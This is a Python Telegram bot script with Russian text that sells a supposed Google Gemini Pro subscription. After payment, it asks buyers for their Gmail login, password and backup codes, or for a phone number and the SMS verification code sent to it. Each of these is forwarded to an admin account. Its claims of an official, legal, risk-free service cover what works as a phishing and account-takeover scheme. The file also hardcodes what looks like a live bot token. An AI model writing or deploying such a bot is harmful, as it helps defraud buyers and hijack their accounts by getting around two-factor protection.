import telebot
from telebot import types

# --- НАСТРОЙКИ БОТА ---
TOKEN = '8748113253:AAHp05rxnNdHGVFAvCcTU0hc7Yks0UUzSPk'
ADMIN_ID = 6305773261  # Твой личный ID

# СЮДА ВСТАВЬ СВОИ ДВЕ ССЫЛКИ ОТ BOOSTY:
PAYMENT_LINK_4000 = 'https://boosty.to/.../4000' 
PAYMENT_LINK_3500 = 'https://boosty.to/.../3500'

VIDEO_FILE_ID = 'СЮДА_ВСТАВЬ_КОД_ВИДЕО_ЕСЛИ_ЕСТЬ'

bot = telebot.TeleBot(TOKEN)

# Словарь для хранения данных пользователей
user_data = {}

# --- КЛАВИАТУРЫ ---
def main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🛒 Купить подписку", callback_data="buy_menu"),
        types.InlineKeyboardButton("🎁 Ввести промокод", callback_data="promo_code"),
        types.InlineKeyboardButton("ℹ️ О подписке", callback_data="about_sub")
    )
    return markup

def back_keyboard(callback_data="start"):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data=callback_data))
    return markup

def payment_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📖 Инструкция и Правила", callback_data="rules"),
        types.InlineKeyboardButton("💳 Оплатить", callback_data="pay"),
        types.InlineKeyboardButton("🔙 Назад", callback_data="start")
    )
    return markup

# --- ГЛАВНОЕ МЕНЮ ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.clear_step_handler_by_chat_id(message.chat.id)
    user_data[message.chat.id] = {'price': 4000, 'state': 'start'}
    text = (
        "Привет! 👋 Добро пожаловать в сервис безопасной активации премиум-подписки *Google Gemini 3.1 Pro*.\n\n"
        "🛡️ *Ваша безопасность — наш приоритет.* Мы используем только официальные партнерские каналы Google. "
        "Все подключения происходят легально, ваши личные данные под надежной защитой. Никаких рисков блокировки.\n\n"
        "Выберите нужное действие в меню ниже 👇"
    )
    bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=main_keyboard())

# --- ОБРАБОТКА ПРОМОКОДА ---
def check_promo(message):
    if message.text.strip().upper() == "VITALIY":
        user_data[message.chat.id]['price'] = 3500
        text = (
            "✅ Промокод успешно применен!\n"
            "Ваша цена со скидкой: *3 500 ₽*.\n\n"
            "⚠️ *СЛЕДИТЕ ЗА ИНСТРУКЦИЯМИ, ЭТО ОЧЕНЬ ВАЖНО!*\n"
            "Перед тем как нажать «Оплатить», обязательно ознакомьтесь с правилами нашего сервиса."
        )
        bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=payment_keyboard())
    else:
        bot.send_message(message.chat.id, "❌ Неверный промокод.", reply_markup=back_keyboard("start"))

# --- ОБРАБОТКА ЧЕКОВ ---
def handle_receipt(message):
    chat_id = message.chat.id
    if message.photo or message.document:
        bot.send_message(chat_id, "⏳ Чек отправлен администратору на проверку. Ожидайте подтверждения (обычно 1-5 минут).")
        
        # Кнопки для Админа
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("✅ Подтвердить оплату", callback_data=f"confirm_pay_{chat_id}"),
            types.InlineKeyboardButton("❌ Отклонить (Фейк/Нет денег)", callback_data=f"reject_pay_{chat_id}")
        )
        
        if message.photo:
            bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=f"💰 НОВАЯ ОПЛАТА от ID: {chat_id}", reply_markup=markup)
        elif message.document:
            bot.send_document(ADMIN_ID, message.document.file_id, caption=f"💰 НОВАЯ ОПЛАТА от ID: {chat_id}", reply_markup=markup)
    else:
        bot.send_message(chat_id, "Пожалуйста, отправьте именно фото или PDF файл чека.")
        bot.register_next_step_handler(message, handle_receipt)

# --- ОБРАБОТКА ДАННЫХ ОТ КЛИЕНТА ---
def receive_old_acc_data(message):
    if message.text:
        bot.send_message(message.chat.id, "✅ Данные приняты! Начинаем активацию, ожидайте.")
        bot.send_message(ADMIN_ID, f"👤 ДАННЫЕ ОТ КЛИЕНТА (Существующий аккаунт):\n\n{message.text}")

def receive_new_acc_phone(message):
    client_id = message.chat.id
    phone = message.text
    bot.send_message(client_id, "✅ Принято! Активация займет 5-15 минут. Ожидайте, мы сообщим, когда придет СМС.")
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📩 СМС придет", callback_data=f"smsyes_{client_id}"),
        types.InlineKeyboardButton("❌ СМС НЕ придет", callback_data=f"smsno_{client_id}")
    )
    bot.send_message(ADMIN_ID, f"🆕 НОВЫЙ АККАУНТ.\nКлиент прислал номер: {phone}\nЧто делаем с СМС?", reply_markup=markup)

def send_credentials_to_client(message, client_id):
    bot.send_message(client_id, "🎉 Ваш новый аккаунт с премиум-подпиской готов!")
    bot.copy_message(client_id, ADMIN_ID, message.message_id)
    bot.send_message(ADMIN_ID, "✅ Данные успешно отправлены клиенту!")

# --- ВЫЗОВ ВЫБОРА АККАУНТА ---
def ask_account_type(chat_id, edit_msg=None):
    text = "🎉 Оплата успешно подтверждена!\n\nТеперь давайте активируем вашу подписку. На какой аккаунт будем ее делать?"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("👤 На мой существующий аккаунт", callback_data="type_old"),
        types.InlineKeyboardButton("🆕 Создать новый аккаунт", callback_data="type_new")
    )
    if edit_msg:
        bot.edit_message_text(text, chat_id, edit_msg.message_id, reply_markup=markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup)

# --- ЕДИНЫЙ РОУТЕР КНОПОК ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    bot.clear_step_handler_by_chat_id(chat_id)

    if chat_id not in user_data:
        user_data[chat_id] = {'price': 4000, 'state': 'start'}

    if call.data == "start":
        bot.delete_message(chat_id, call.message.message_id)
        send_welcome(call.message)

    elif call.data == "about_sub":
        bot.delete_message(chat_id, call.message.message_id)
        text = (
            "*В чем разница между Бесплатной версией и Gemini 3.1 Pro?*\n\n"
            "👑 *С подпиской Gemini 3.1 Pro:*\n"
            "✅ *Gemini Advanced (3.1 Pro):* Самая умная нейросеть.\n"
            "🎬 *Veo 3.1:* Топовый генератор видео по тексту.\n"
            "🎨 *Nano Banana 2 (с доступом к Pro):* Создание шедевров из фото.\n"
            "☁️ *Google One на 2 ТЕРАБАЙТА:* Огромное облако навсегда!\n\n"
            "⏳ Срок действия: 12 месяцев."
        )
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=back_keyboard("start"))

    elif call.data == "promo_code":
        bot.edit_message_text("Отправьте ваш промокод в чат:", chat_id, call.message.message_id, reply_markup=back_keyboard("start"))
        bot.register_next_step_handler(call.message, check_promo)

    elif call.data == "buy_menu":
        price = user_data[chat_id]['price']
        text = (
            f"Вы перешли к покупке подписки Google Gemini 3.1 Pro.\n💰 К оплате: *{price} ₽*.\n\n"
            "⚠️ *СЛЕДИТЕ ЗА ИНСТРУКЦИЯМИ, ЭТО ОЧЕНЬ ВАЖНО!*\n"
            "Перед тем как нажать «Оплатить», обязательно ознакомьтесь с правилами нашего сервиса."
        )
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=payment_keyboard())

    elif call.data == "rules":
        text = (
            "*Как будет проходить процесс:*\n"
            "1. Вы нажимаете «Оплатить» и отправляете чек в этот чат.\n"
            "2. Администратор проверяет оплату (1-10 минут).\n"
            "3. Бот предложит выбор: Существующий аккаунт или Новый.\n"
            "4. Активация займет 5–7 минут.\n\n"
            "🚫 *ПРАВИЛА (ВАЖНО!):*\n"
            "• Для активации на существующий аккаунт потребуются Резервные коды Google.\n"
            "• В случае умышленного предоставления неверных данных заявка аннулируется без возврата средств."
        )
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=back_keyboard("buy_menu"))

    elif call.data == "pay":
        price = user_data[chat_id]['price']
        # Выбор ссылки в зависимости от промокода
        link = PAYMENT_LINK_3500 if price == 3500 else PAYMENT_LINK_4000
        
        text = (
            f"Для оплаты перейдите по официальной ссылке:\n🔗 {link}\n\n"
            "🧾 *После оплаты:* Обязательно отправьте скриншот чека или PDF прямо в этот чат!"
        )
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=back_keyboard("buy_menu"))
        bot.register_next_step_handler(call.message, handle_receipt)

    # --- КНОПКИ ДЛЯ АДМИНА (ПРОВЕРКА ЧЕКА) ---
    elif call.data.startswith("confirm_pay_"):
        client_id = int(call.data.split("_")[2])
        bot.edit_message_text("✅ Ты подтвердил оплату!", chat_id, call.message.message_id)
        ask_account_type(client_id)

    elif call.data.startswith("reject_pay_"):
        client_id = int(call.data.split("_")[2])
        bot.edit_message_text("❌ Ты отклонил чек.", chat_id, call.message.message_id)
        bot.send_message(client_id, "❌ Оплата не найдена. Если произошла ошибка, свяжитесь с поддержкой.")

    # --- ВЫБОР ТИПА АККАУНТА ---
    elif call.data == "back_to_acc_type":
        ask_account_type(chat_id, edit_msg=call.message)

    elif call.data == "type_old":
        text = (
            "Отлично! Вы выбрали активацию на собственный аккаунт.\n\n"
            "🛡 *Безопасность:* Для активации нам потребуется разовый вход. Вы можете предоставить запасной аккаунт.\n\n"
            "Напишите нам ОДНИМ сообщением:\n1. Логин (Gmail)\n2. Пароль\n3. Два 8-значных резервных кода\n\n"
            "Если вы не поняли, что это за коды, нажмите на кнопку «Инструкция»."
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📖 Инструкция по кодам", callback_data="instruction"))
        markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data="back_to_acc_type"))
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        bot.register_next_step_handler(call.message, receive_old_acc_data)

    elif call.data == "type_new":
        text = (
            "Супер! Мы создадим для вас чистый аккаунт.\n"
            "Для безопасности он будет привязан к вашему номеру.\n\n"
            "📱 *Отправьте нам четкий, рабочий номер телефона:*\n"
            "⚠️ Будьте на связи, скоро запросим код из СМС!"
        )
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='Markdown', reply_markup=back_keyboard("back_to_acc_type"))
        bot.register_next_step_handler(call.message, receive_new_acc_phone)

    elif call.data == "instruction":
        bot.send_message(chat_id, "Загружаю видеоинструкцию...")
        try:
            bot.send_video(chat_id, VIDEO_FILE_ID, caption="Как получить резервные коды.\nПосле просмотра отправьте ваши данные сюда.")
        except:
            bot.send_message(chat_id, "Видео скоро будет добавлено. Пока найдите в настройках безопасности Google 'Резервные коды'.")
        bot.register_next_step_handler(call.message, receive_old_acc_data)

    # --- КНОПКИ АДМИНА ПРО СМС ---
    elif call.data.startswith("smsyes_"):
        client_id = int(call.data.split("_")[1])
        bot.send_message(client_id, "⚠️ *Внимание! Сейчас на ваш номер поступит СМС от Google. Напишите код из СМС прямо сюда!*", parse_mode='Markdown')
        bot.edit_message_text("✅ Ты выбрал: СМС придет. Ждем код от клиента.", chat_id, call.message.message_id)
        user_data[client_id] = {'state': 'waiting_for_sms_code'}

    elif call.data.startswith("smsno_"):
        client_id = int(call.data.split("_")[1])
        msg = bot.send_message(chat_id, "❌ СМС НЕ придет. Отправь сюда логин и пароль, который нужно выдать клиенту.")
        bot.register_next_step_handler(msg, send_credentials_to_client, client_id)

# --- ПЕРЕХВАТ ТЕКСТА (СМС КОДЫ И ОБЩЕНИЕ С АДМИНОМ) ---
@bot.message_handler(content_types=['text'])
def handle_text(message):
    chat_id = message.chat.id
    # Если клиент ждет СМС
    if chat_id in user_data and user_data[chat_id].get('state') == 'waiting_for_sms_code':
        bot.send_message(ADMIN_ID, f"📩 Код СМС от клиента {chat_id}:\n{message.text}")
        bot.send_message(chat_id, "Код принят, завершаем активацию...")
        user_data[chat_id]['state'] = 'start' # Сброс состояния
    # Если просто пишут в чат (пересылаем админу)
    elif chat_id != ADMIN_ID:
        bot.send_message(ADMIN_ID, f"💬 Сообщение от клиента {chat_id}:\n{message.text}")

# --- ЗАПУСК БОТА ---
print("Бот успешно запущен! Ожидание сообщений...")
try:
    bot.infinity_polling(timeout=90, long_polling_timeout=50)
except Exception as e:

    print(f"Ошибка интернета: {e}")
